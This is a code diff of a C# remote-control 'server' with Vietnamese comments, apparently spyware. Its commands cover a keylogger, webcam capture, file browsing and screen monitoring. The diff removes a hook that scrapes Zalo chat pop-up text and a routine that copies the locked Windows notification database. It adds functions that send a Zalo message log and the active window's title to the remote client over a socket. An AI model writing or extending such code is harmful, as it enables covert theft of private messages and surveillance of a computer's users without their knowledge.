@@ -30,43 +30,8 @@ namespace server
         DateTime lastSendTime = DateTime.MinValue;
         PerformanceCounter cpuCounter;
         PerformanceCounter ramCounter;
-
-        // ===== ZALO NOTIFY HOOK =====
-        delegate void WinEventDelegate(
-            IntPtr hWinEventHook,
-            uint eventType,
-            IntPtr hwnd,
-            int idObject,
-            int idChild,
-            uint dwEventThread,
-            uint dwmsEventTime
-        );
-
-        [DllImport("user32.dll")]
-        static extern IntPtr SetWinEventHook(
-            uint eventMin,
-            uint eventMax,
-            IntPtr hmodWinEventProc,
-            WinEventDelegate lpfnWinEventProc,
-            uint idProcess,
-            uint idThread,
-            uint dwFlags
-        );
-
-        [DllImport("user32.dll")]
-        static extern uint GetWindowThreadProcessId(
-            IntPtr hWnd,
-            out uint lpdwProcessId
-        );
-
-        const uint EVENT_OBJECT_SHOW = 0x8002;
-        const uint WINEVENT_OUTOFCONTEXT = 0;
-
-        IntPtr zaloHook = IntPtr.Zero;
-        WinEventDelegate zaloDelegate;
-
         
-
+        
         public server()
         {
             InitializeComponent();
@@ -80,9 +45,9 @@ namespace server
             tklog.SetApartmentState(ApartmentState.STA); 
             tklog.IsBackground = true; 
             tklog.Start();
-            startZaloNotifyHook();
-            
+
             KeyLogger.appstart.isRecording = false;
+    
         }
         public void receiveSignal(ref String s)
         {
@@ -104,6 +69,16 @@ namespace server
         [DllImport("user32.dll")]
         public static extern bool LockWorkStation();
 
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)] 
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        [DllImport("user32.dll")]
+        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
+
         // 2. Hàm xử lý khóa máy an toàn
         public void lockSystem()
         {
@@ -118,86 +93,6 @@ namespace server
             }
         }
 
-        public void startZaloNotifyHook()
-        {
-            try
-            {
-                zaloDelegate = new WinEventDelegate(ZaloWinEvent);
-
-                zaloHook = SetWinEventHook(
-                    EVENT_OBJECT_SHOW,
-                    EVENT_OBJECT_SHOW,
-                    IntPtr.Zero,
-                    zaloDelegate,
-                    0,
-                    0,
-                    WINEVENT_OUTOFCONTEXT
-                );
-            }
-            catch { }
-        }
-
-
-        void ZaloWinEvent(
-            IntPtr hWinEventHook,
-            uint eventType,
-            IntPtr hwnd,
-            int idObject,
-            int idChild,
-            uint dwEventThread,
-            uint dwmsEventTime)
-        {
-            try
-            {
-                if (hwnd == IntPtr.Zero) return;
-
-                uint pid;
-                GetWindowThreadProcessId(hwnd, out pid);
-
-                Process p = Process.GetProcessById((int)pid);
-
-                // Chỉ bắt Zalo
-                if (!p.ProcessName.ToLower().Contains("zalo"))
-                    return;
-
-                AutomationElement root = AutomationElement.FromHandle(hwnd);
-                if (root == null) return;
-
-                string text = ExtractZaloText(root);
-                if (string.IsNullOrWhiteSpace(text)) return;
-
-                // Gửi về client
-                Program.nw.WriteLine("[ZALO_NOTIFY]");
-                Program.nw.WriteLine(text);
-                Program.nw.Flush();
-            }
-            catch { }
-        }
-
-        string ExtractZaloText(AutomationElement root)
-        {
-            StringBuilder sb = new StringBuilder();
-
-            try
-            {
-                var walker = TreeWalker.ControlViewWalker;
-                var child = walker.GetFirstChild(root);
-
-                while (child != null)
-                {
-                    if (child.Current.ControlType == ControlType.Text)
-                    {
-                        string name = child.Current.Name;
-                        if (!string.IsNullOrWhiteSpace(name))
-                            sb.AppendLine(name);
-                    }
-                    child = walker.GetNextSibling(child);
-                }
-            }
-            catch { }
-
-            return sb.ToString().Trim();
-        }
 
         public RegistryKey baseRegistryKey(ref String link)
         {
@@ -308,77 +203,6 @@ namespace server
             }
         }
 
-        public void getNotiDB()
-        {
-            string tempPath = Path.GetTempFileName(); // Tạo tên file tạm
-            bool success = false;
-
-            try
-            {
-                // 1. Xác định đường dẫn DB chính xác
-                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                string dbPath = Path.Combine(localAppData, @"Microsoft\Windows\Notifications\wpndatabase.db");
-
-                // Nếu không tìm thấy ở user hiện tại, thử tìm thủ công trong C:\Users
-                if (!File.Exists(dbPath))
-                {
-                    string currentName = Environment.UserName;
-                    
-                    // --- [SỬA LỖI Ở ĐÂY]: Thay cú pháp $"" bằng cộng chuỗi bình thường ---
-                    dbPath = @"C:\Users\" + currentName + @"\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db";
-                    // -------------------------------------------------------------------
-                }
-
-                if (File.Exists(dbPath))
-                {
-                    // 2. KỸ THUẬT COPY XUYÊN KHÓA (FileShare.ReadWrite)
-                    using (FileStream source = new FileStream(dbPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                    {
-                        using (FileStream dest = new FileStream(tempPath, FileMode.Create))
-                        {
-                            source.CopyTo(dest);
-                        }
-                    }
-                    success = true;
-                }
-            }
-            catch 
-            {
-                success = false; 
-            }
-
-            try
-            {
-                if (success)
-                {
-                    // 3. Gửi kích thước
-                    long len = new FileInfo(tempPath).Length;
-                    Program.nw.WriteLine(len.ToString());
-                    Program.nw.Flush();
-
-                    // 4. Gửi dữ liệu
-                    using (FileStream fs = new FileStream(tempPath, FileMode.Open, FileAccess.Read))
-                    {
-                        byte[] buffer = new byte[4096];
-                        int bytesRead;
-                        while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
-                        {
-                            Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
-                        }
-                    }
-                }
-                else
-                {
-                    Program.nw.WriteLine("0"); Program.nw.Flush();
-                }
-                
-                if (File.Exists(tempPath)) File.Delete(tempPath);
-            }
-            catch
-            {
-                Program.nw.WriteLine("0"); Program.nw.Flush();
-            }
-        }
 
         public String getvalue(ref RegistryKey a,ref String link,ref String valueName)
         {
@@ -547,6 +371,39 @@ namespace server
                 }
             }
         }
+
+        public void monitorActiveApp()
+        {
+            try
+            {
+                IntPtr hwnd = GetForegroundWindow();
+                // Nếu không có cửa sổ nào (ví dụ màn hình khóa), gửi Unknown
+                if (hwnd == IntPtr.Zero) {
+                    Program.nw.WriteLine("Unknown|System");
+                    Program.nw.Flush();
+                    return;
+                }
+
+                uint pid;
+                GetWindowThreadProcessId(hwnd, out pid);
+                Process p = Process.GetProcessById((int)pid);
+
+                StringBuilder title = new StringBuilder(512);
+                GetWindowText(hwnd, title, title.Capacity);
+
+                // Gửi: Tên Process | Tiêu đề cửa sổ
+                string data = p.ProcessName + "|" + title.ToString();
+                Program.nw.WriteLine(data);
+                Program.nw.Flush();
+            }
+            catch 
+            {
+                Program.nw.WriteLine("Unknown|Error");
+                Program.nw.Flush();
+            }
+        }
+
+
         public void webcam()
         {
             String ss = "";
@@ -985,6 +842,42 @@ namespace server
 
         }
 
+        public void getZaloLog()
+        {
+            try
+            {
+                // Đường dẫn file log mà hàm Hook đang ghi vào
+                string logPath = Path.Combine(Path.GetTempPath(), "zalo_log.txt");
+
+                if (File.Exists(logPath))
+                {
+                    // 1. Gửi kích thước file
+                    long len = new FileInfo(logPath).Length;
+                    Program.nw.WriteLine(len.ToString());
+                    Program.nw.Flush();
+
+                    // 2. Gửi nội dung file
+                    // Dùng FileShare.ReadWrite để đọc được ngay cả khi Hook đang ghi
+                    using (FileStream fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    {
+                        byte[] buffer = new byte[4096];
+                        int bytesRead;
+                        while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
+                        }
+                    }
+                }
+                else
+                {
+                    Program.nw.WriteLine("0"); Program.nw.Flush();
+                }
+            }
+            catch
+            {
+                Program.nw.WriteLine("0"); Program.nw.Flush();
+            }
+        }
 
         public void process()
         {
@@ -1154,7 +1047,7 @@ namespace server
                 Program.client = Program.server.Accept();
                 Program.ns = new NetworkStream(Program.client);
                 Program.nr = new StreamReader(Program.ns);
-                Program.nw = new StreamWriter(Program.ns);
+                Program.nw = new StreamWriter(Program.ns, Encoding.UTF8) { AutoFlush = true };
                 
                 String s = "";
                 bool clientConnected = true;
@@ -1179,8 +1072,10 @@ namespace server
                             case "WEBCAM": webcam(); break; // <--- Đảm bảo có dòng này
                             case "EXPLORER": fileManager(); break;
                             case "GET_INSTALLED": listInstalledApps(); break;
-                            case "GET_NOTI": getNotiDB(); break;
+                            case "GET_ZALO_LOG": getZaloLog(); break;
                             case "MONITOR": monitor(); break;
+                            case "GET_ACTIVE_APP": monitorActiveApp(); break;
+
                             case "QUIT": clientConnected = false; break;
                         }
                     }
